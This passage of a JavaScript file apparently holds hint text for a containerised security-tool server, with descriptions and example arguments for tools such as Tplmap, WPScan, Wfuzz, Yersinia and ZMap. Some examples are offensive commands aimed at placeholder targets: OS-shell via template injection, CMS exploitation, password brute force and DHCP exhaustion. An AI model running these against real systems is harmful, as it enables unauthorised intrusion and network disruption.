    ],
  },

  // ── Tplmap ────────────────────────────────────────────────────────────────
  run_tplmap: {
    description: 'Detects and exploits Server-Side Template Injection in various template engines. Input is a target URL with optional injection point. Output is the template engine detected and optional RCE proof.',
    hint: 'Server-Side Template Injection exploitation framework.',
    examples: [
      { label: 'Scan URL', value: '-u https://example.com/page?name=test' },
      { label: 'POST param', value: '-u https://example.com/render -d "template=test"' },
      { label: 'OS shell', value: '-u https://example.com/page?name=test --os-shell' },
    ],
  },

  // ── Trivy ─────────────────────────────────────────────────────────────────
  run_trivy: {
    description: 'Scans container images, filesystems, and repos for CVEs and misconfigurations. Input is an image name or path with optional scanner flag. Output is CVEs with severity, package, and fix version.',
    hint: 'All-in-one security scanner — container images, filesystems, IaC, SBOMs.',
    examples: [
      { label: 'Docker image', value: 'image ubuntu:22.04' },
      { label: 'Filesystem', value: 'fs /path/to/project' },
      { label: 'Repo', value: 'repo https://github.com/example/repo' },
      { label: 'High+ only', value: 'image --severity HIGH,CRITICAL nginx:latest' },
      { label: 'JSON output', value: 'image -f json nginx:latest' },
    ],
  },

  // ── TruffleHog ────────────────────────────────────────────────────────────
  run_trufflehog: {
    description: 'Searches git repos, filesystems, and S3 buckets for leaked credentials and secrets. Input is a path or URL. Output is detected secrets with file location, line number, and secret type.',
    hint: 'Find leaked credentials and secrets in git repos, filesystems, S3, etc.',
    examples: [
      { label: 'Scan git repo', value: 'git https://github.com/example/repo' },
      { label: 'Local repo', value: 'git file:///path/to/local/repo' },
      { label: 'Filesystem', value: 'filesystem /path/to/dir' },
      { label: 'Only verified', value: 'git https://github.com/example/repo --only-verified' },
    ],
  },

  // ── Uncover ───────────────────────────────────────────────────────────────
  run_uncover: {
    description: 'Searches multiple internet scanning databases (Shodan, Censys, Fofa) for exposed services. Input is a search query with optional engine flag. Output is a list of matching hosts and services.',
    hint: 'Query multiple search engines (Shodan, Censys, Fofa, etc.) in one command.',
    examples: [
      { label: 'Shodan query', value: '-q "apache" -e shodan' },
      { label: 'Multi-engine', value: '-q "title:Jenkins" -e shodan,censys,fofa' },
      { label: 'Field output', value: '-q "nginx" -f ip:port' },
    ],
  },

  // ── VirusTotal ────────────────────────────────────────────────────────────
  run_virustotal: {
    description: "Analyzes files, URLs, and IPs using VirusTotal's 70+ antivirus engines. Input is Shodan-style CLI flags or a file/URL/hash to analyze. Output is detection results and metadata.",
    hint: 'Query VirusTotal for file hash, URL, domain, or IP analysis. Requires VT API key.',
    examples: [
      { label: 'Hash lookup', value: 'file 44d88612fea8a8f36de82e1278abb02f' },
      { label: 'URL scan', value: 'url https://example.com' },
      { label: 'Domain report', value: 'domain example.com' },
      { label: 'IP report', value: 'ip 8.8.8.8' },
    ],
  },

  // Note: virustotal-mcp exposes individual structured tools — not a CLI wrapper.
  vt_file_report: {
    description: 'Returns VirusTotal scan results for a file by its hash (MD5, SHA1, or SHA-256). Input is a file hash string. Output is detection counts, AV vendor verdicts, and file metadata.',
    hint: 'Get the VirusTotal analysis report for a file by its hash (MD5, SHA-1, or SHA-256). Requires VT_API_KEY.',
    examples: [
      { label: 'SHA256 hash', value: '44d88612fea8a8f36de82e1278abb02f5abbbe43f334f2d1fd6b3c9e3e6e7b08' },
      { label: 'MD5 hash', value: '44d88612fea8a8f36de82e1278abb02f' },
    ],
  },

  vt_url_report: {
    description: 'Returns VirusTotal analysis for a URL. Input is a URL string. Output is detection ratio, vendor verdicts, and URL categories.',
    hint: 'Get the VirusTotal analysis report for a URL. Requires VT_API_KEY.',
    examples: [
      { label: 'Check URL', value: 'https://example.com/suspicious.php' },
    ],
  },

  vt_domain_report: {
    description: 'Returns VirusTotal intelligence for a domain. Input is a domain name. Output is reputation score, DNS records, associated URLs, and malicious activity history.',
    hint: 'Get the VirusTotal analysis report for a domain. Requires VT_API_KEY.',
    examples: [
      { label: 'Domain report', value: 'example.com' },
      { label: 'Subdomain', value: 'malicious.example.com' },
    ],
  },

  vt_ip_report: {
    description: 'Returns VirusTotal threat data for an IP address. Input is an IPv4 address. Output is reputation score, ASN, associated domains, and threat detections.',
    hint: 'Get the VirusTotal analysis report for an IP address. Requires VT_API_KEY.',
    examples: [
      { label: 'IP report', value: '8.8.8.8' },
      { label: 'Suspicious IP', value: '185.220.101.1' },
    ],
  },

  vt_scan_url: {
    description: 'Submits a URL to VirusTotal for scanning and returns an analysis ID. Input is a URL. Output is the analysis ID which can be checked with vt_get_analysis.',
    hint: 'Submit a URL to VirusTotal for scanning. Returns an analysis_id to check with vt_get_analysis. Requires VT_API_KEY.',
    examples: [
      { label: 'Submit URL', value: 'https://example.com/page' },
    ],
  },

  vt_get_analysis: {
    description: 'Retrieves results for a previously submitted VirusTotal analysis. Input is an analysis ID from vt_scan_url. Output is the scan results with vendor detections.',
    hint: 'Get the status and results of a VirusTotal analysis by its ID. Use after vt_scan_url. Requires VT_API_KEY.',
    examples: [
      { label: 'Check analysis', value: 'u-abc123def456-1234567890' },
    ],
  },

  // ── Volatility ────────────────────────────────────────────────────────────
  run_volatility: {
    description: 'Analyzes memory dumps for forensics and malware investigation. Input is a memory image path with plugin name (e.g. pslist, netscan). Output is extracted processes, network connections, or artifacts.',
    hint: 'Memory forensics analysis (Volatility 2). -f specifies memory image file.',
    examples: [
      { label: 'List processes', value: '-f memory.dmp --profile=Win7SP1x64 pslist' },
      { label: 'Network conns', value: '-f memory.dmp --profile=Win7SP1x64 netscan' },
      { label: 'Dump hashes', value: '-f memory.dmp --profile=Win7SP1x64 hashdump' },
      { label: 'Command history', value: '-f memory.dmp --profile=Win7SP1x64 cmdscan' },
    ],
  },

  // ── Volatility3 ───────────────────────────────────────────────────────────
  run_volatility3: {
    description: 'Modern version of Volatility for memory forensics supporting Windows, Linux, and macOS. Input is a memory image and plugin (e.g. windows.pslist). Output is structured forensic data.',
    hint: 'Memory forensics analysis (Volatility 3) — auto-detects OS profile.',
    examples: [
      { label: 'List processes', value: '-f memory.dmp windows.pslist' },
      { label: 'Network conns', value: '-f memory.dmp windows.netscan' },
      { label: 'Dump hashes', value: '-f memory.dmp windows.hashdump' },
      { label: 'Linux processes', value: '-f memory.dmp linux.pslist' },
    ],
  },

  // ── VulnX ─────────────────────────────────────────────────────────────────
  run_vulnx: {
    description: 'CMS vulnerability scanner targeting WordPress, Joomla, Drupal, and other platforms. Input is a target URL. Output is detected CMS type, version, and known vulnerabilities.',
    hint: 'CMS vulnerability scanner and exploitation framework.',
    examples: [
      { label: 'Detect CMS', value: '-u https://example.com' },
      { label: 'WordPress', value: '-u https://example.com --cms wp' },
      { label: 'Full exploit', value: '-u https://example.com --cms wp --exploit' },
    ],
  },

  // ── Wafw00f ───────────────────────────────────────────────────────────────
  run_wafw00f: {
    description: 'Detects Web Application Firewalls (WAF) in front of a target website. Input is a URL. Output is the detected WAF vendor and confidence level.',
    hint: 'Detect and fingerprint Web Application Firewalls (WAF).',
    examples: [
      { label: 'Detect WAF', value: 'https://example.com' },
      { label: 'All WAFs', value: '-a https://example.com' },
      { label: 'URL list', value: '-i targets.txt' },
    ],
  },

  // ── Wapiti ────────────────────────────────────────────────────────────────
  run_wapiti: {
    description: 'Web application vulnerability scanner for XSS, SQL injection, file inclusion, and more. Input is a target URL with optional depth and module flags. Output is a list of vulnerabilities with evidence.',
    hint: 'Web application vulnerability scanner — SQLi, XSS, XXE, SSRF, and more.',
    examples: [
      { label: 'Basic scan', value: '-u https://example.com' },
      { label: 'Specific module', value: '-u https://example.com -m sql,xss' },
      { label: 'Depth limit', value: '-u https://example.com --depth 3' },
      { label: 'JSON report', value: '-u https://example.com -f json -o report.json' },
    ],
  },

  // ── WappalyzerGo ──────────────────────────────────────────────────────────
  run_wappalyzergo: {
    description: 'Identifies web technologies, frameworks, and CMS platforms used by a website. Input is a URL. Output is a list of detected technologies with categories and versions.',
    hint: 'Detect technologies used by a website (Go implementation of Wappalyzer).',
    examples: [
      { label: 'Detect tech', value: 'https://example.com' },
      { label: 'JSON output', value: '-json https://example.com' },
    ],
  },

  // ── Waybackurls ───────────────────────────────────────────────────────────
  run_waybackurls: {
    description: 'Fetches all known URLs for a domain from the Wayback Machine. Input is a domain name. Output is a list of historical URLs that have been archived.',
    hint: 'Fetch all URLs archived in the Wayback Machine for a domain.',
    examples: [
      { label: 'All URLs', value: 'example.com' },
      { label: 'Get redirects', value: 'example.com --get-versions' },
    ],
  },

  // ── Wfuzz ─────────────────────────────────────────────────────────────────
  run_wfuzz: {
    description: 'Fuzzes web application parameters, headers, and paths to find vulnerabilities. Input is a URL with FUZZ placeholder and wordlist. Output is responses that deviate from baseline.',
    hint: 'Web fuzzer — FUZZ keyword marks injection point. Supports filters.',
    examples: [
      { label: 'Dir brute', value: '-w /usr/share/wordlists/dirb/common.txt https://example.com/FUZZ' },
      { label: 'Filter 404', value: '-w wordlist.txt --hc 404 https://example.com/FUZZ' },
      { label: 'POST fuzzing', value: '-w passwords.txt -d "user=admin&pass=FUZZ" https://example.com/login' },
      { label: 'Cookie auth', value: '-w wordlist.txt -b "session=abc123" https://example.com/FUZZ' },
    ],
  },

  // ── WhatsMyName ───────────────────────────────────────────────────────────
  run_whatsmyname: {
    description: 'Checks if a username exists across hundreds of websites and social platforms. Input is a username. Output is a list of sites where the account was found.',
    hint: 'Username enumeration across many websites using the WhatsMyName database.',
    examples: [
      { label: 'Username search', value: '-u johndoe' },
      { label: 'Multiple users', value: '-u johndoe -u janedoe' },
    ],
  },

  // ── WhatWeb ───────────────────────────────────────────────────────────────
  run_whatweb: {
    description: 'Identifies web technologies, plugins, and server details for a URL. Input is a URL with optional aggression level flag. Output is detected technologies with version info.',
    hint: 'Web technology fingerprinting — CMS, frameworks, server software.',
    examples: [
      { label: 'Basic detect', value: 'https://example.com' },
      { label: 'Aggressive', value: '-a 3 https://example.com' },
      { label: 'URL list', value: '--input-file=targets.txt' },
      { label: 'JSON output', value: '--log-json=output.json https://example.com' },
    ],
  },

  // ── Whois ─────────────────────────────────────────────────────────────────
  whois_lookup: {
    description: 'Performs a WHOIS lookup for a domain name to get registration information. Input is a domain name (e.g. example.com). Output is registrar, registration date, expiry date, and nameservers.',
    hint: 'WHOIS registration lookup for a domain using port-43 WHOIS protocol. Queries the authoritative server for registrar, dates, nameservers, and status. For raw output, set include_raw to true.',
    examples: [
      { label: 'Domain WHOIS', value: 'example.com' },
      { label: '.io domain', value: 'cloudflare.com' },
      { label: 'With raw', value: 'github.com' },
    ],
  },

  refresh_whois_servers: {
    description: 'Refreshes the internal list of WHOIS servers from IANA. No input required. Run this if WHOIS lookups are failing for specific TLDs.',
    hint: 'Refresh the WHOIS server list from IANA. No arguments required. Run periodically to update TLD coverage.',
    examples: [],
  },

  list_supported_tlds: {
    description: 'Lists all TLDs (top-level domains) supported by the WHOIS server. Input is optional limit count. Output is a list of supported TLD strings.',
    hint: 'List all TLDs (Top-Level Domains) that have WHOIS servers available. Optionally specify a limit.',
    examples: [
      { label: 'All TLDs', value: '' },
    ],
  },

  // ── WiFiPhisher ───────────────────────────────────────────────────────────
  run_wifiphisher: {
    description: 'WiFi phishing attack tool — requires physical WiFi hardware and host network access, cannot run in Docker. Input is interface and SSID flags. Output is captured credentials from victims connecting to the rogue AP.',
    hint: 'Rogue access point framework stub. The full wifiphisher tool requires Python 2 dependencies, host networking, and a physical WiFi interface — it cannot run in this Docker container. Use a native Kali install for real attacks.',
    examples: [
      { label: 'Show help', value: '--help' },
      { label: 'Show version', value: '--version' },
    ],
  },

  // ── Wireshark / TShark ────────────────────────────────────────────────────
  // Note: wireshark-mcp exposes run_tshark (not run_wireshark), plus download_file and cleanup_downloads.
  run_wireshark: {
    description: 'Note: this server exposes run_tshark, not run_wireshark. Use run_tshark for packet capture analysis.',
    hint: 'Note: the actual tool name is run_tshark. Analyse pcap/pcapng files using tshark CLI syntax.',
    examples: [
      { label: 'Read pcap', value: '-r capture.pcap' },
      { label: 'HTTP traffic', value: '-r capture.pcap -Y "http"' },
    ],
  },

  run_tshark: {
    description: 'Analyzes network packet captures using TShark (Wireshark CLI). Input is a pcap file URL (download it first with download_file) and optional display filter. Output is decoded packet data.',
    hint: 'Run TShark (Wireshark CLI) to analyse network traffic or pcap files. Use standard tshark flags. Optionally provide source_url to download a pcap before analysis — use {source} as placeholder in arguments.',
    examples: [
      { label: 'Read pcap', value: '-r capture.pcap' },
      { label: 'HTTP filter', value: '-r capture.pcap -Y "http"' },
      { label: 'DNS queries', value: '-r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name' },
      { label: 'Extract fields', value: '-r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg' },
    ],
  },

  download_file: {
    description: 'Downloads a file from a URL into the working directory for use in other tools. Input is a URL. Output is a job ID used to reference the downloaded file.',
    hint: 'Download a file (HTTP/HTTPS URL, GitHub/GitLab repo, or data: URI) into the container workspace for analysis. Returns a job_id to reference in run_tshark or pass to cleanup_downloads.',
    examples: [
      { label: 'Download pcap', value: 'https://example.com/capture.pcap' },
      { label: 'GitHub repo', value: 'https://github.com/wireshark/wireshark' },
    ],
  },

  cleanup_downloads: {
    description: 'Removes downloaded files from the working directory. Input is a job ID or omit to clean all. Frees disk space after analysis.',
    hint: 'Remove downloaded files from the container workspace. Provide a job_id to remove a specific download, or leave empty to remove all downloads.',
    examples: [
      { label: 'Clean all', value: '' },
    ],
  },

  // ── WireMCP ───────────────────────────────────────────────────────────────
  wiremcp_info: {
    description: 'Returns status and version information for the WireMCP server. No input required.',
    hint: 'Returns basic status and info for the WireMCP server. No arguments required.',
    examples: [],
  },

  // ── WPScan ────────────────────────────────────────────────────────────────
  run_wpscan: {
    description: 'Scans WordPress sites for vulnerabilities, outdated plugins, weak passwords, and exposed users. Input is a target URL with optional flags (--enumerate u for users, --passwords for brute force). Output is findings with CVE details.',
    hint: 'WordPress vulnerability scanner. --api-token required for CVE data.',
    examples: [
      { label: 'Basic scan', value: '--url https://example.com' },
      { label: 'Enum users', value: '--url https://example.com -e u' },
      { label: 'Enum plugins', value: '--url https://example.com -e ap' },
      { label: 'Brute creds', value: '--url https://example.com -e u -P passwords.txt' },
    ],
  },

  // ── XSSer ─────────────────────────────────────────────────────────────────
  run_xsser: {
    description: 'Automated XSS vulnerability detection and exploitation framework. Input is a target URL with injection point parameters. Output is vulnerable parameters with working XSS payloads.',
    hint: 'Automated XSS testing and exploitation framework.',
    examples: [
      { label: 'Scan URL', value: '-u "https://example.com/search?q=test"' },
      { label: 'POST param', value: '-u "https://example.com/search" --post "q=test"' },
      { label: 'Auto mode', value: '--auto -u "https://example.com/search?q=test"' },
    ],
  },

  // ── XSStrike ──────────────────────────────────────────────────────────────
  run_xsstrike: {
    description: 'Advanced XSS scanner with fuzzing and context analysis. Input is a target URL. Output is XSS vulnerabilities with payload and context details.',
    hint: 'Advanced XSS detection suite with intelligent payload generation.',
    examples: [
      { label: 'Crawl and scan', value: '--crawl -u https://example.com' },
      { label: 'Scan URL', value: '-u "https://example.com/search?q=test"' },
      { label: 'Blind XSS', value: '-u "https://example.com/search?q=test" --blind' },
    ],
  },

  // ── YARA ──────────────────────────────────────────────────────────────────
  run_yara: {
    description: 'Scans files and processes against YARA rules to identify malware patterns. Input is a rules file and target file or directory. Output is matched rules and file details.',
    hint: 'Pattern matching for malware classification and threat hunting.',
    examples: [
      { label: 'Scan file', value: 'rules.yar malware.exe' },
      { label: 'Scan directory', value: '-r rules.yar /path/to/dir' },
      { label: 'Multiple rules', value: '-r /path/to/rules/ /path/to/scan/' },
      { label: 'String matches', value: '-s rules.yar malware.exe' },
    ],
  },

  // ── Yersinia ──────────────────────────────────────────────────────────────
  run_yersinia: {
    description: 'Tests network protocols (STP, CDP, DHCP, 802.1Q) for Layer 2 attacks. Input is a protocol and attack type flag. Output is network protocol manipulation results.',
    hint: 'Layer 2 network attack tool — STP, CDP, DHCP, 802.1Q, VTP attacks.',
    examples: [
      { label: 'Interactive mode', value: '-I' },
      { label: 'STP attack', value: '-A stp -attack 1 -interface eth0' },
      { label: 'DHCP exhaustion', value: '-A dhcp -attack 1 -interface eth0' },
    ],
  },

  // ── ZAP ───────────────────────────────────────────────────────────────────
  run_zap: {
    description: 'OWASP ZAP automated web application security scanner. Input is zap.sh flags with -cmd and -quickurl or -autorun for automated scans. Output is a vulnerability report with OWASP risk ratings.',
    hint: 'OWASP ZAP web application security scanner. Runs zap.sh directly — must use -cmd flag to avoid GUI mode (headless). Key options: -cmd -quickurl <url>, -cmd -quickprogress, -cmd -autorun <yaml>. GUI mode is not supported in this container.',
    examples: [
      { label: 'Quick spider+scan', value: '-cmd -quickurl https://example.com -quickprogress' },
      { label: 'Daemon mode', value: '-daemon -port 8090 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true' },
      { label: 'Autorun plan', value: '-cmd -autorun /zap/plan.yaml' },
      { label: 'Import OpenAPI', value: '-cmd -openapi https://example.com/openapi.json -quickurl https://example.com' },
    ],
  },

  // ── ZMap ──────────────────────────────────────────────────────────────────
  run_zmap: {
    description: 'Scans the entire IPv4 internet or large ranges for open ports at high speed. Input is a target port and optional IP range with --rate flag. Output is responsive hosts with the specified port open.',
    hint: 'Internet-scale single-packet port scanner. Use low --rate to avoid disruption.',
    examples: [
      { label: 'Scan port 80', value: '-p 80 192.168.1.0/24' },
      { label: 'Port 443', value: '-p 443 192.168.1.0/24 --rate 100' },
      { label: 'Output CSV', value: '-p 22 192.168.1.0/24 -o results.csv' },
      { label: 'Bandwidth limit', value: '-p 80 192.168.1.0/24 -B 10M' },
    ],
  },

};

/**
 * Look up hints for a given tool name.
 * Returns { hint, examples } or null.
 */
export function getToolHints(toolName) {
  return HINTS[toolName] || null;
}
